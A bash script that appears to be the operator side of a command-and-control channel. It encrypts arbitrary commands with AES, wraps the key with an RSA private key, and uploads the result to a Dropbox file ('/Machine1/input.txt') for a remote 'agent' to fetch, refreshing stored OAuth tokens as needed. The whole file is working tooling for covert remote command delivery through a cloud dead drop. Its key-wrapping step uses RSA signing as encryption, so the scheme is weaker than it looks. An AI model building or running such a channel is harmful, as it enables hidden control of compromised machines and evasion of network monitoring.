#!/bin/bash

################################################################################
# SCRIPT: writer.sh
# DESCRIPTION: Controller-side - Encrypt commands and send to agent via Dropbox
################################################################################

# === QUIET MODE ===
QUIET_MODE=0
if [ "$1" = "-q" ]; then
    QUIET_MODE=1
    shift
fi

log() {
    [ $QUIET_MODE -eq 0 ] && echo "$@"
}

PRIVATE_KEY_FILE="private_key.pem"
INPUT_PATH="/Machine1/input.txt"
REFRESH_TOKEN_FILE=".dropbox_refresh_token"
TOKEN_CACHE_FILE=".dropbox_access_token"

if [ -f "$REFRESH_TOKEN_FILE" ]; then
    source "$REFRESH_TOKEN_FILE"
else
    echo "[TOKEN]: [X] File $REFRESH_TOKEN_FILE not found!" >&2
    exit 1
fi

refresh_access_token() {
    log "[TOKEN]: Refreshing access token..."
    
    response=$(curl -s -X POST https://api.dropboxapi.com/oauth2/token \
        -d refresh_token=$REFRESH_TOKEN \
        -d grant_type=refresh_token \
        -d client_id=$APP_KEY \
        -d client_secret=$APP_SECRET)
    
    new_token=$(echo "$response" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    
    if [ -n "$new_token" ]; then
        ACCESS_TOKEN="$new_token"
        echo "$new_token" > "$TOKEN_CACHE_FILE"
        log "[TOKEN]: [OK] New token saved"
        return 0
    else
        echo "[TOKEN]: [X] ERROR parsing token" >&2
        exit 1
    fi
}

if [ -f "$TOKEN_CACHE_FILE" ]; then
    ACCESS_TOKEN=$(cat "$TOKEN_CACHE_FILE")
else
    refresh_access_token
fi

if [ -z "$1" ]; then
    echo "Enter command to send:"
    read -r COMMAND
else
    COMMAND="$*"
fi

log "[INPUT]: Command to encrypt: '$COMMAND'"
log "[INPUT]: Hybrid encryption (RSA+AES)..."

aes_key=$(openssl rand -hex 32)
aes_iv=$(openssl rand -hex 16)

encrypted_command=$(echo -n "$COMMAND" | \
    openssl enc -aes-256-cbc -K "$aes_key" -iv "$aes_iv" 2>/dev/null | base64 -w 0)

aes_credentials="${aes_key}:${aes_iv}"
encrypted_aes=$(echo -n "$aes_credentials" | \
    openssl rsautl -sign -inkey "$PRIVATE_KEY_FILE" 2>/dev/null | base64 -w 0)

if [ -n "$encrypted_command" ] && [ -n "$encrypted_aes" ]; then
    encrypted_input="${encrypted_aes}:${encrypted_command}"
    log "[INPUT]: [OK] Command encrypted"
else
    echo "[INPUT]: [X] Encryption ERROR" >&2
    exit 1
fi

log "[INPUT]: Uploading to Dropbox..."

response=$(echo -n "$encrypted_input" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer $ACCESS_TOKEN" \
    --header "Dropbox-API-Arg: {\"path\":\"$INPUT_PATH\",\"mode\":\"overwrite\",\"autorename\":false}" \
    --header "Content-Type: application/octet-stream" \
    --data-binary @-)

if echo "$response" | grep -q "expired_access_token\|invalid_access_token"; then
    log "[TOKEN]: [!] Invalid token, refreshing and retrying..."
    refresh_access_token || exit 1
    
    response=$(echo -n "$encrypted_input" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
        --header "Authorization: Bearer $ACCESS_TOKEN" \
        --header "Dropbox-API-Arg: {\"path\":\"$INPUT_PATH\",\"mode\":\"overwrite\",\"autorename\":false}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @-)
fi

if [ $QUIET_MODE -eq 0 ]; then
    echo ""
    echo "$response"
    echo ""
fi

log "[INPUT]: [OK] File updated"
